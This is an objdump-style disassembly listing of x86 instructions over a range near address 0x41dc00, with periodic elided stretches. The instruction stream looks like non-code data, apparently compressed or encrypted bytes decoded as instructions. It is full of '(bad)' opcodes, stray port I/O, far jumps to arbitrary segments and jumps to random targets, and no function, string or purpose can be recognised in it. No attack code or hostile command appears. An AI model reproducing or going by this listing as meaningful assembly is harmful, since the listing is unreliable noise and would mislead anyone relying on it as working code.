  41dbf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbf6:	mov    cl,0xe6
  41dbf8:	cmp    BYTE PTR [edx+0x40],cl
  41dbfb:	inc    ebp
  41dbfc:	sbb    esi,esi
  41dbfe:	push   ds
  41dbff:	adc    al,0xdd
  41dc01:	fcom   QWORD PTR [esi+0x47]
  41dc04:	ja     0x41db90
  41dc06:	mov    esi,0xe5df36d2
  41dc0b:	push   ebx
  41dc0c:	cmp    ebx,ebp
  41dc0e:	inc    edx
  41dc0f:	clc    
  41dc10:	add    ebx,ebp
  41dc12:	rcr    BYTE PTR [edx-0x22bfb60b],0xbd
  41dc19:	dec    edx
  41dc1a:	jns    0x41dc79
  41dc1c:	popf   
  41dc1d:	pop    esp
  41dc1e:	adc    eax,0x35873efc
  41dc23:	push   ebp
  41dc24:	outs   dx,DWORD PTR ds:[esi]
  41dc25:	outs   dx,BYTE PTR ds:[esi]
  41dc26:	sub    al,0xc6
  41dc28:	push   es
  41dc29:	push   eax
  41dc2a:	(bad)  [ebp+0x6ec12d02]
  41dc30:	mov    esp,0x9c1a7d5
  41dc35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc36:	pop    ebx
  41dc37:	mov    eax,ds:0x89efacf2
  41dc3c:	inc    ebp
  41dc3d:	sub    edx,esp
  41dc3f:	in     al,dx
  41dc40:	sbb    eax,0x0
	...
  41dcb1:	add    BYTE PTR [eax],al
  41dcb3:	add    BYTE PTR [eax-0x67],ah
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0x4d
  41dcc1:	mov    ds:0x40772cb5,al
  41dcc6:	add    DWORD PTR [eax],eax
  41dcc8:	cmc    
  41dcc9:	add    BYTE PTR [eax],al
  41dccb:	add    BYTE PTR [edi-0x3df6fdde],dh
  41dcd1:	jmp    0x41dd47
  41dcd3:	mov    ch,0x4d
  41dcd5:	xchg   edx,eax
  41dcd6:	cmp    al,0x82
  41dcd8:	push   esp
  41dcd9:	in     eax,0xb1
  41dcdb:	(bad)  
  41dcdc:	outs   dx,BYTE PTR ds:[esi]
  41dcdd:	cmp    ebx,DWORD PTR [edx+ecx*8+0x2ea5df4b]
  41dce4:	mov    ah,0x44
  41dce6:	push   0xf8868e23
  41dceb:	gs mov edx,ds
  41dcee:	mov    ah,0xbb
  41dcf0:	inc    edx
  41dcf1:	inc    esi
  41dcf2:	adc    eax,0xedf0c93e
  41dcf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcf8:	lods   eax,DWORD PTR ds:[esi]
  41dcf9:	xchg   ecx,eax
  41dcfa:	mov    dl,0x27
  41dcfc:	jmp    0x41dcea
  41dcfe:	(bad)  
  41dd00:	mov    WORD PTR [ebp-0x56],gs
  41dd03:	or     ah,BYTE PTR [esi+0x4ba4d463]
  41dd09:	daa    
  41dd0a:	xor    DWORD PTR [ebx+eax*1-0x7edd92bd],esp
  41dd11:	adc    al,cl
  41dd13:	add    DWORD PTR [eax+0x34],esp
  41dd16:	pop    esi
  41dd17:	inc    edx
  41dd18:	aaa    
  41dd19:	sbb    eax,0x1ae633b0
  41dd1e:	sahf   
  41dd1f:	xchg   esi,eax
  41dd20:	popf   
  41dd21:	mov    ebp,edx
  41dd23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd24:	hlt    
  41dd25:	cmp    al,0x5
  41dd27:	cli    
  41dd28:	xchg   DWORD PTR [ecx-0x6be50ceb],esi
  41dd2e:	scas   al,BYTE PTR es:[edi]
  41dd2f:	mov    al,ds:0x96abb9b5
  41dd34:	jp     0x41dcce
  41dd36:	cwde   
  41dd37:	jmp    0x41dd80
  41dd39:	mov    eax,0xad986514
  41dd3e:	xchg   BYTE PTR [ebx+edi*2],dh
  41dd41:	test   BYTE PTR [ecx+0x26],ah
  41dd44:	ins    DWORD PTR es:[edi],dx
  41dd45:	sbb    bl,cl
  41dd47:	add    al,0xc
  41dd49:	ins    DWORD PTR es:[edi],dx
  41dd4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd4b:	leave  
  41dd4c:	sbb    DWORD PTR [edi],edi
  41dd4e:	shl    BYTE PTR ds:0xeba2d31d,0xdb
  41dd55:	lds    esi,FWORD PTR [ebx-0x71195231]
  41dd5b:	jge    0x41dd75
  41dd5d:	xchg   ebp,eax
  41dd5e:	loop   0x41dd0b
  41dd60:	sar    BYTE PTR [edi+0x250e6a80],1
  41dd66:	xchg   DWORD PTR [ebx],ebp
  41dd68:	xchg   esp,eax
  41dd69:	push   cs
  41dd6a:	pop    edi
  41dd6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd6c:	jmp    0x8720:0xf5227916
  41dd73:	lods   eax,DWORD PTR ds:[esi]
  41dd74:	push   ebx
  41dd75:	jns    0x41dd7b
  41dd77:	pop    edx
  41dd78:	mov    dl,0xc5
  41dd7a:	mov    BYTE PTR [esi-0x256a5752],cl
  41dd80:	dec    edi
  41dd81:	add    BYTE PTR [edx+eiz*4-0x78306b94],0xb4
  41dd89:	gs dec ebp
  41dd8b:	push   ss
  41dd8c:	inc    ecx
  41dd8d:	aad    0xe9
  41dd8f:	or     esi,DWORD PTR [edi+0x27]
  41dd92:	inc    ebp
  41dd93:	mov    ds:0x53ea5e93,al
  41dd98:	sub    DWORD PTR [ecx],edi
  41dd9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd9b:	nop
  41dd9c:	aaa    
  41dd9d:	or     eax,0x709f3c68
  41dda2:	pop    ebx
  41dda3:	shl    BYTE PTR [edx+0x52],1
  41dda6:	mov    edx,esp
  41dda8:	das    
  41dda9:	adc    eax,0x18bda112
  41ddae:	xor    dh,ch
  41ddb0:	(bad)  
  41ddb1:	push   eax
  41ddb2:	pushf  
  41ddb3:	add    BYTE PTR [esi-0x40c20b03],bl
  41ddb9:	fsub   st(2),st
  41ddbb:	aam    0x31
  41ddbd:	retf   0xa875
  41ddc0:	js     0x41ddc2
	...
  41de32:	add    BYTE PTR [eax],al
  41de34:	pop    es
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	out    dx,eax
  41de41:	cwde   
  41de42:	xchg   edi,eax
  41de43:	push   edi
  41de44:	ins    BYTE PTR es:[edi],dx
  41de45:	inc    ecx
  41de46:	add    DWORD PTR [eax],eax
  41de48:	cmc    
  41de49:	add    BYTE PTR [eax],al
  41de4b:	add    bh,bl
  41de4d:	loope  0x41dec8
  41de4f:	ds ins DWORD PTR es:[edi],dx
  41de51:	out    0xd8,al
  41de53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de54:	(bad)  
  41de55:	aad    0xb4
  41de57:	cmc    
  41de58:	jb     0x41dea8
  41de5a:	cs cmc 
  41de5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de5d:	jne    0x41dede
  41de5f:	test   DWORD PTR [ecx+0x318f811e],edi
  41de65:	sbb    dl,BYTE PTR [esi-0xb74c810]
  41de6b:	mov    bl,dh
  41de6d:	in     eax,dx
  41de6e:	fdiv   DWORD PTR [esi+0x24f92283]
  41de74:	imul   ebp,DWORD PTR ds:0x6d2a1a18,0x3f075145
  41de7e:	pop    ebx
  41de7f:	nop
  41de80:	rcl    BYTE PTR [edi+0x177f666f],1
  41de86:	dec    edx
  41de87:	cmp    al,0xb0
  41de89:	(bad)  
  41de8a:	mov    eax,0x8feedff8
  41de8f:	xlat   BYTE PTR ds:[ebx]
  41de90:	fs mov ch,0xf5
  41de93:	je     0x41de9b
  41de95:	pusha  
  41de96:	fist   WORD PTR [esi]
  41de98:	dec    esp
  41de99:	mov    eax,0x88092e9d
  41de9e:	cmp    eax,0x642022d2
  41dea3:	loopne 0x41dede
  41dea5:	jmp    0xeee50267
  41deaa:	jnp    0x41de60
  41deac:	and    DWORD PTR [ebx-0x59b27749],edx
  41deb2:	or     eax,DWORD PTR [ecx+0x60aa2da6]
  41deb8:	push   ebx
  41deb9:	out    dx,eax
  41deba:	idiv   BYTE PTR [ecx]
  41debc:	xchg   esp,eax
  41debd:	cs out dx,eax
  41debf:	inc    esi
  41dec0:	xor    eax,0x5f8e6f2d
  41dec5:	sub    BYTE PTR [edx+ebx*8],dl
  41dec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dec9:	dec    ebp
  41deca:	fdiv   st,st(6)
  41decc:	out    dx,eax
  41decd:	dec    ebp
  41dece:	aas    
  41decf:	rcl    BYTE PTR [edx-0x10],cl
  41ded2:	mov    fs,ebp
  41ded4:	popa   
  41ded5:	dec    edx
  41ded6:	div    esp
  41ded8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ded9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41deda:	dec    ebp
  41dedb:	mov    bh,0x5d
  41dedd:	data16 icebp 
  41dedf:	sub    ebp,DWORD PTR [eax+0x5b]
  41dee2:	or     BYTE PTR [esi+0x1fc6cf30],ch
  41dee8:	mov    bl,0xef
  41deea:	jmp    FWORD PTR [ecx+0x3f]
  41deed:	jp     0x41df4b
  41deef:	fstp   QWORD PTR [ecx-0x36]
  41def2:	clc    
  41def3:	sbb    DWORD PTR [edi],0x68
  41def6:	adc    edx,DWORD PTR [esi-0x3a]
  41def9:	xor    eax,0x513d0d25
  41deff:	cld    
  41df00:	dec    eax
  41df01:	daa    
  41df02:	inc    edi
  41df03:	pop    eax
  41df04:	rcr    BYTE PTR [ebp+0x52],1
  41df07:	(bad)  
  41df08:	xchg   edx,eax
  41df09:	and    al,0x63
  41df0b:	sbb    eax,DWORD PTR [ebx+0x1c8e9de2]
  41df11:	push   0x5dd3c17f
  41df16:	jmp    0x10d6beaf
  41df1b:	pop    es
  41df1c:	adc    dl,ah
  41df1e:	cs loopne 0x41dec0
  41df21:	stos   BYTE PTR es:[edi],al
  41df22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df23:	xchg   ebp,eax
  41df24:	xor    al,0xed
  41df26:	fisubr DWORD PTR [edi-0x4f1fccd0]
  41df2c:	mov    gs,ebp
  41df2e:	lods   eax,DWORD PTR gs:[esi]
  41df30:	out    dx,eax
  41df31:	daa    
  41df32:	add    ecx,edi
  41df34:	and    DWORD PTR [ebx+0x4dc0b38b],esi
  41df3a:	push   eax
  41df3b:	mov    ebp,0x223520c2
  41df40:	push   eax
	...
  41dfb1:	add    BYTE PTR [eax],al
  41dfb3:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	mov    dh,0x66
  41dfc2:	sub    DWORD PTR [edi],ebp
  41dfc4:	popa   
  41dfc5:	inc    edx
  41dfc6:	add    DWORD PTR [eax],eax
  41dfc8:	cmc    
  41dfc9:	add    BYTE PTR [eax],al
  41dfcb:	add    dl,bh
  41dfcd:	xchg   edi,eax
  41dfce:	xor    ebp,DWORD PTR [edi]
  41dfd0:	dec    DWORD PTR [ecx+0xa]
  41dfd3:	and    al,0xdd
  41dfd5:	inc    eax
  41dfd6:	repz icebp 
  41dfd8:	in     al,0xfa
  41dfda:	jbe    0x41df9a
  41dfdc:	sbb    al,0x6e
  41dfde:	lods   eax,DWORD PTR fs:[esi]
  41dfe0:	mov    ch,0x3b
  41dfe2:	inc    esp
  41dfe3:	inc    esi
  41dfe4:	dec    esi
  41dfe5:	mov    edx,0xc7f6fbaa
  41dfea:	jne    0x41df93
  41dfec:	call   FWORD PTR [edi+0x68]
  41dfef:	sub    ah,BYTE PTR [ebp-0x6f]
  41dff2:	push   ebx
  41dff3:	and    eax,0x21e6ff38
  41dff8:	(bad)  
  41dff9:	jmp    0xb76100b8
  41dffe:	jge    0x41e042
  41e000:	add    BYTE PTR [ebx+ebx*8],bh
  41e003:	sub    BYTE PTR [ecx],cl
  41e005:	cmp    ebx,edi
  41e007:	addr16 out dx,eax
  41e009:	sbb    BYTE PTR [edi+0x719294a0],al
  41e00f:	jae    0x41dfd3
  41e011:	and    DWORD PTR [ecx],edx
  41e013:	xor    esi,DWORD PTR ds:0xde1efc80
  41e019:	pop    es
  41e01a:	push   edx
  41e01b:	(bad)  
  41e01c:	shl    DWORD PTR [edx+0x4],1
  41e01f:	lods   al,BYTE PTR ds:[esi]
  41e020:	shl    BYTE PTR [ebp+ebp*2-0x18],cl
  41e024:	sahf   
  41e025:	push   eax
  41e026:	ds ds dec ebx
  41e029:	jne    0x41e06f
  41e02b:	jge    0x41e052
  41e02d:	popw   es
  41e02f:	aaa    
  41e030:	je     0x41e015
  41e032:	sub    edx,DWORD PTR [eax]
  41e034:	shl    BYTE PTR [eax],cl
  41e036:	pop    es
  41e037:	sub    al,BYTE PTR [edx]
  41e039:	popf   
  41e03a:	fwait
  41e03b:	push   0xc3e8ef29
  41e040:	mov    dl,0xd2
  41e042:	imul   edx,DWORD PTR [ebx],0x6c6e1efb
  41e048:	push   ds
  41e049:	sub    DWORD PTR [esi+ebx*1],ebx
  41e04c:	mov    ah,BYTE PTR [ebx+0x3f]
  41e04f:	push   esp
  41e050:	adc    bl,BYTE PTR [eax+0x7bca5cb5]
  41e056:	sub    DWORD PTR [ebx],0x1b377146
  41e05c:	(bad)  
  41e05d:	xchg   ecx,eax
  41e05e:	ins    BYTE PTR es:[edi],dx
  41e05f:	push   ebx
  41e060:	out    dx,eax
  41e061:	imul   ebp,DWORD PTR [ecx-0x26db29ac],0xdafcc307
  41e06b:	sub    bh,BYTE PTR ds:0x87eee989
  41e071:	jg     0x41e02f
  41e073:	mov    al,ds:0xcbbf4b97
  41e078:	push   esp
  41e079:	xor    al,0x63
  41e07b:	pop    ds
  41e07c:	and    BYTE PTR es:[ecx+eax*4-0x6988bad3],al
  41e084:	jl     0x41e08b
  41e086:	setg   BYTE PTR [edx+eax*1+0x7001716c]
  41e08e:	or     al,0xd9
  41e090:	cmovno ebx,DWORD PTR [eax-0x1ef0ddd]
  41e097:	dec    ebp
  41e098:	sahf   
  41e099:	adc    bl,BYTE PTR [ecx-0x34]
  41e09c:	xlat   BYTE PTR ds:[ebx]
  41e09d:	sub    BYTE PTR [esi+0x67e2996d],al
  41e0a3:	lahf   
  41e0a4:	shr    BYTE PTR [ebp+0x2269db54],0x5d
  41e0ab:	sbb    eax,0x63b102fb
  41e0b0:	mov    ecx,0xe7ecca07
  41e0b5:	push   ebp
  41e0b6:	test   DWORD PTR [esi+0x1debceac],ebx
  41e0bc:	ret    0x7981
  41e0bf:	std    
  41e0c0:	xchg   DWORD PTR [eax],eax
	...
  41e132:	add    BYTE PTR [eax],al
  41e134:	push   eax
  41e135:	ret    
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	mov    BYTE PTR [eax+0x4356f464],cl
  41e146:	add    DWORD PTR [eax],eax
  41e148:	cmc    
  41e149:	add    BYTE PTR [eax],al
  41e14b:	add    BYTE PTR [ecx+ebp*2],bl
  41e14e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e14f:	xor    eax,0x6fdc6537
  41e154:	(bad)  
  41e155:	scas   eax,DWORD PTR es:[edi]
  41e156:	enter  0x78f1,0xd1
  41e15a:	test   BYTE PTR [esi+0x70383841],ch
  41e160:	xchg   ebx,eax
  41e161:	xor    DWORD PTR [eax],esp
  41e163:	les    edi,FWORD PTR [ecx+eiz*4]
  41e166:	retf   
  41e167:	out    0xc0,al
  41e169:	or     al,0x8e
  41e16b:	jns    0x41e166
  41e16d:	cmp    al,0x16
  41e16f:	cmp    BYTE PTR [edi-0xd1e5651],ch
  41e175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e176:	outs   dx,DWORD PTR ds:[esi]
  41e177:	in     al,0xef
  41e179:	add    eax,eax
  41e17b:	clc    
  41e17c:	popa   
  41e17d:	pop    ss
  41e17e:	addr16 inc esp
  41e180:	sub    cl,al
  41e182:	sahf   
  41e183:	or     DWORD PTR [edi],ebx
  41e185:	bound  esi,QWORD PTR ds:0xc87d866b
  41e18b:	adc    al,0x98
  41e18d:	xchg   ebx,eax
  41e18e:	adc    ebp,eax
  41e190:	test   BYTE PTR [esi],bl
  41e192:	add    DWORD PTR [ebx],edx
  41e194:	jg     0x41e132
  41e196:	mov    ecx,0xfb7fc9e4
  41e19b:	scas   eax,DWORD PTR es:[edi]
  41e19c:	sub    al,0x11
  41e19e:	xchg   ebp,eax
  41e19f:	xchg   DWORD PTR [eax],ebp
  41e1a1:	rcl    BYTE PTR [edx-0x20],1
  41e1a4:	sbb    edi,edx
  41e1a6:	adc    edi,ebp
  41e1a8:	dec    esp
  41e1a9:	jns    0x41e19a
  41e1ab:	push   ecx
  41e1ad:	sub    DWORD PTR [ebp+0x20d5e5d2],0x2f222fb6
  41e1b7:	or     ebx,DWORD PTR [ecx+ebp*1+0x5043b4b1]
  41e1be:	pop    esp
  41e1bf:	int3   
  41e1c0:	jmp    DWORD PTR [edi]
  41e1c2:	adc    DWORD PTR [esi+edi*1+0x58a15b8f],0x51
  41e1ca:	xchg   ecx,eax
  41e1cb:	stos   BYTE PTR es:[edi],al
  41e1cc:	xchg   esp,eax
  41e1cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1ce:	xchg   edx,eax
  41e1cf:	je     0x41e1ff
  41e1d1:	mov    esi,0x4029ba4d
  41e1d6:	xchg   esp,eax
  41e1d7:	mov    BYTE PTR [esi],bh
  41e1d9:	xor    eax,0x3ebd32e
  41e1de:	cli    
  41e1df:	in     al,dx
  41e1e0:	adc    al,0x6f
  41e1e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1e3:	sub    ch,BYTE PTR [ebp-0xadd6850]
  41e1e9:	or     eax,0x943a1aa9
  41e1ee:	or     DWORD PTR [edi],0xb8946034
  41e1f4:	popa   
  41e1f5:	add    edx,esi
  41e1f7:	loope  0x41e219
  41e1f9:	jge    0x41e1a2
  41e1fb:	sub    ah,BYTE PTR ds:[ebx]
  41e1fe:	ror    DWORD PTR [edi],cl
  41e200:	call   0xabf01a1c
  41e205:	out    0xb6,al
  41e207:	mov    ah,0x46
  41e209:	hlt    
  41e20a:	push   ebx
  41e20b:	loop   0x41e18d
  41e20d:	inc    ecx
  41e20e:	mov    bl,0xf4
  41e210:	mov    bl,BYTE PTR [esi-0x2b00e3d7]
  41e216:	ja     0x41e261
  41e218:	sub    BYTE PTR gs:[ebx],cl
  41e21b:	adc    BYTE PTR [ebp-0x4e689160],0x49
  41e222:	int3   
  41e223:	and    bl,dh
  41e225:	add    al,0x44
  41e227:	pusha  
  41e228:	arpl   WORD PTR [edx+0x7a577ba1],sp
  41e22e:	mov    edx,0xc40a5351
  41e233:	(bad)  
  41e234:	sar    eax,1
  41e236:	jle    0x41e214
  41e238:	push   edi
  41e239:	mov    DWORD PTR [ebp+0x77],ecx
  41e23c:	loopne 0x41e23e
  41e23e:	lock ror BYTE PTR [ebx+0x0],cl
	...
  41e2b1:	add    BYTE PTR [eax],al
  41e2b3:	add    dh,bh
  41e2b5:	cmp    cl,0x54
  41e2b8:	(bad)  
  41e2b9:	jge    0x41e2ba
  41e2bb:	stos   BYTE PTR es:[edi],al
  41e2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2bd:	push   esi
  41e2be:	arpl   WORD PTR [ebx-0x27],di
  41e2c1:	and    BYTE PTR [eax],0x89
  41e2c4:	dec    ebx
  41e2c5:	inc    esp
  41e2c6:	add    DWORD PTR [eax],eax
  41e2c8:	cmc    
  41e2c9:	add    BYTE PTR [eax],al
  41e2cb:	add    BYTE PTR [edx],dh
  41e2cd:	jmp    0xf82b257e
  41e2d2:	and    BYTE PTR [ebp-0x22],cl
  41e2d5:	out    dx,al
  41e2d6:	call   0x7b2e706f
  41e2db:	inc    ecx
  41e2dc:	fwait
  41e2dd:	mov    DWORD PTR [ebx+0x16],esi
  41e2e0:	pop    eax
  41e2e1:	call   0x616a:0xcaab9214
  41e2e8:	sub    ah,BYTE PTR [esi-0x64896fdf]
  41e2ee:	push   cs
  41e2ef:	add    dh,cl
  41e2f1:	mov    BYTE PTR [eax+0x5a706282],bh
  41e2f7:	mov    ah,0xce
  41e2f9:	fcomp  QWORD PTR [ecx]
  41e2fb:	inc    edi
  41e2fc:	xchg   DWORD PTR [eax+0x7edff89f],edx
  41e302:	or     ch,dh
  41e304:	adc    BYTE PTR ds:0xd0658dec,bh
  41e30a:	add    bl,BYTE PTR [ebp-0x7eaf4035]
  41e310:	dec    ebp
  41e311:	cdq    
  41e312:	das    
  41e313:	jle    0x41e2fc
  41e315:	sti    
  41e316:	sub    al,0x63
  41e318:	retf   
  41e319:	mov    esi,0xd8ef8ae6
  41e31e:	test   DWORD PTR fs:[ebp+0x43],esi
  41e322:	jne    0x41e335
  41e324:	pop    ebp
  41e325:	jg     0x41e3a0
  41e327:	sub    eax,0xf9aacab7
  41e32c:	mov    bh,0x28
  41e32e:	imul   ecx,DWORD PTR [edi-0x36],0xccb15e6
  41e335:	pop    es
  41e336:	daa    
  41e337:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e339:	ins    DWORD PTR es:[edi],dx
  41e33a:	adc    cl,BYTE PTR [ebx-0x6]
  41e33d:	mov    ds:0xa843e929,al
  41e342:	in     eax,dx
  41e343:	jne    0x41e347
  41e345:	cmp    ebx,DWORD PTR [edi+0x16]
  41e348:	sub    al,0x85
  41e34a:	or     eax,0x796dd567
  41e34f:	and    eax,0xd3756a2a
  41e354:	jnp    0x41e301
  41e356:	push   ds
  41e357:	push   cs
  41e358:	push   0x81515c0a
  41e35d:	cmc    
  41e35e:	(bad)  
  41e35f:	cmp    ebp,DWORD PTR [ecx-0x5bf86f21]
  41e365:	scas   eax,DWORD PTR es:[edi]
  41e366:	ds mov ecx,0x3ee0bc94
  41e36c:	pop    eax
  41e36d:	jmp    0x41e2f0
  41e36f:	inc    eax
  41e370:	test   BYTE PTR ds:0x663476d2,ch
  41e376:	dec    edx
  41e377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e378:	scas   al,BYTE PTR es:[edi]
  41e379:	or     DWORD PTR [edx+0x60167d12],esi
  41e37f:	add    BYTE PTR [esi+0x15673ee8],cl
  41e385:	std    
  41e386:	dec    ecx
  41e387:	sbb    al,0x78
  41e389:	scas   al,BYTE PTR es:[edi]
  41e38a:	push   ebp
  41e38b:	jmp    0x41e31f
  41e38d:	ins    DWORD PTR es:[edi],dx
  41e38e:	loopne 0x41e34e
  41e390:	mov    ah,BYTE PTR ds:0xc2e3828d
  41e396:	xor    eax,0xfa4e9d6c
  41e39b:	xor    eax,0x6421f435
  41e3a0:	out    dx,al
  41e3a1:	enter  0x1e17,0xa4
  41e3a5:	sub    DWORD PTR ds:0xbc7ad35a,edi
  41e3ab:	jae    0x41e423
  41e3ad:	jb     0x41e3e3
  41e3af:	scas   al,BYTE PTR es:[edi]
  41e3b0:	dec    ebp
  41e3b1:	pushf  
  41e3b2:	(bad)  
  41e3b3:	xor    BYTE PTR [ecx-0x2],cl
  41e3b6:	push   ebx
  41e3b7:	adc    esp,ebp
  41e3b9:	in     al,0x18
  41e3bb:	in     eax,dx
  41e3bc:	mov    ds:0xb73d5010,eax
	...
  41e431:	add    BYTE PTR [eax],al
  41e433:	add    dh,dh
  41e435:	rcl    BYTE PTR ss:[edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0x75bfead,al
  41e442:	scas   al,BYTE PTR es:[edi]
  41e443:	add    DWORD PTR [eax+0x45],eax
  41e446:	add    DWORD PTR [eax],eax
  41e448:	cmc    
  41e449:	add    BYTE PTR [eax],al
  41e44b:	add    BYTE PTR [ecx+0x6f],ch
  41e44e:	and    al,0xb1
  41e450:	mov    ds:0x5f5d0f34,al
  41e455:	jecxz  0x41e417
  41e457:	in     eax,0xcf
  41e459:	in     al,dx
  41e45a:	enter  0xf662,0xfd
  41e45e:	sub    ebx,esi
  41e460:	adc    al,0x83
  41e462:	adc    ecx,ecx
  41e464:	fwait
  41e465:	xlat   BYTE PTR ds:[ebx]
  41e466:	pop    eax
  41e467:	loopne 0x41e3f5
  41e469:	push   esi
  41e46a:	dec    esp
  41e46b:	aam    0xd2
  41e46d:	sti    
  41e46e:	push   ss
  41e46f:	xlat   BYTE PTR ds:[ebx]
  41e470:	in     al,0x44
  41e472:	mov    dh,0xff
  41e474:	fdivr  QWORD PTR [edx+ebx*1-0x1d]
  41e478:	adc    DWORD PTR [esi+0x163dd4c6],esp
  41e47e:	xchg   ebp,eax
  41e47f:	add    eax,0xaac9ce85
  41e484:	xchg   esi,eax
  41e485:	push   esi
  41e486:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41e488:	xchg   ecx,eax
  41e489:	adc    edi,DWORD PTR [eax+0x21]
  41e48c:	inc    edi
  41e48d:	les    esp,FWORD PTR [edx+esi*1+0x5a]
  41e491:	inc    eax
  41e492:	mov    ecx,0xfac6a235
  41e497:	dec    ebp
  41e498:	and    al,0x1e
  41e49a:	xor    bh,BYTE PTR [edi-0x454c9882]
  41e4a0:	inc    ecx
  41e4a1:	les    esp,FWORD PTR [ebp*2+0x70864271]
  41e4a8:	jge    0x41e45f
  41e4aa:	mov    cl,BYTE PTR [edi]
  41e4ac:	xchg   ecx,eax
  41e4ad:	test   al,0xd9
  41e4af:	sbb    ah,dh
  41e4b1:	cs aad 0xdd
  41e4b4:	inc    ebx
  41e4b5:	xchg   esp,eax
  41e4b6:	xor    DWORD PTR [ebx-0x140e3cb8],esi
  41e4bc:	or     cl,bh
  41e4be:	mov    eax,DWORD PTR [ecx]
  41e4c0:	sub    al,0x1f
  41e4c2:	outs   dx,DWORD PTR ds:[esi]
  41e4c3:	sbb    ebx,esi
  41e4c5:	rcr    DWORD PTR [ecx+0x6b9fb7d8],0xe4
  41e4cc:	mov    ah,0xeb
  41e4ce:	nop
  41e4cf:	imul   eax,ecx,0x95850f50
  41e4d5:	push   ds
  41e4d6:	mov    ecx,0xd10980bb
  41e4db:	aaa    
  41e4dc:	dec    ebx
  41e4dd:	or     edi,DWORD PTR [edx+0x5248edf8]
  41e4e3:	in     eax,dx
  41e4e4:	sub    DWORD PTR [eax-0x984dbdb],eax
  41e4ea:	or     ebx,ebx
  41e4ec:	sar    BYTE PTR [edx],cl
  41e4ee:	xlat   BYTE PTR ds:[ebx]
  41e4ef:	test   eax,0x70d6f12f
  41e4f4:	or     dh,ah
  41e4f6:	dec    esi
  41e4f7:	sub    BYTE PTR [ebx-0x69b63c5a],bh
  41e4fd:	shl    BYTE PTR [ebp+esi*1+0x2],0xcb
  41e502:	sti    
  41e503:	ret    0x4d18
  41e506:	je     0x41e4b3
  41e508:	loopne 0x41e535
  41e50a:	push   esp
  41e50b:	and    eax,0x775ee613
  41e510:	scas   al,BYTE PTR es:[edi]
  41e511:	xchg   edi,eax
  41e512:	cwde   
  41e513:	inc    ebp
  41e514:	add    eax,0xf00986b
  41e519:	mov    cl,0x60
  41e51b:	cwde   
  41e51c:	sub    DWORD PTR ds:0x7a9e9f5,ebp
  41e522:	cmp    BYTE PTR [eax+edi*2+0x4c],bl
  41e526:	daa    
  41e527:	jp     0x41e50f
  41e529:	push   cs
  41e52a:	(bad)  
  41e52b:	jl     0x41e580
  41e52d:	ja     0x41e53f
  41e52f:	add    DWORD PTR [edx],0xec2b9462
  41e535:	les    ebx,FWORD PTR [edi]
  41e537:	mov    edi,0x27ede19f
  41e53c:	or     al,0xca
  41e53e:	or     ch,ch
  41e540:	push   esi
	...
  41e5b1:	add    BYTE PTR [eax],al
  41e5b3:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz add al,0x2b
  41e5c2:	cli    
  41e5c3:	(bad)  
  41e5c4:	xor    eax,0xf5000146
  41e5c9:	add    BYTE PTR [eax],al
  41e5cb:	add    cl,cl
  41e5cd:	sti    
  41e5ce:	ins    DWORD PTR es:[edi],dx
  41e5cf:	les    edi,FWORD PTR [eax]
  41e5d1:	dec    edx
  41e5d2:	push   DWORD PTR [eax+0x375ce6c8]
  41e5d8:	mov    fs,WORD PTR [esi-0x77975ff9]
  41e5de:	mov    DWORD PTR ds:[ebx],edx
  41e5e1:	sbb    eax,0xa46ddbe5
  41e5e6:	push   ebx
  41e5e7:	nop
  41e5e8:	pop    ss
  41e5e9:	sub    al,0xbc
  41e5eb:	stos   DWORD PTR es:[edi],eax
  41e5ec:	mov    eax,ds:0xdb47d00a
  41e5f1:	and    edx,DWORD PTR [ebx-0x7430c06f]
  41e5f7:	cdq    
  41e5f8:	out    dx,al
  41e5f9:	clc    
  41e5fa:	pop    ss
  41e5fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5fc:	(bad)  
  41e5fd:	cmp    esp,ebx
  41e5ff:	dec    edi
  41e600:	das    
  41e601:	fcom   st(2)
  41e603:	ss loop 0x41e601
  41e606:	sti    
  41e607:	(bad)  [ecx+0x5c]
  41e60a:	pop    edi
  41e60b:	arpl   WORD PTR [edi-0x36],sp
  41e60e:	scas   al,BYTE PTR es:[edi]
  41e60f:	inc    ecx
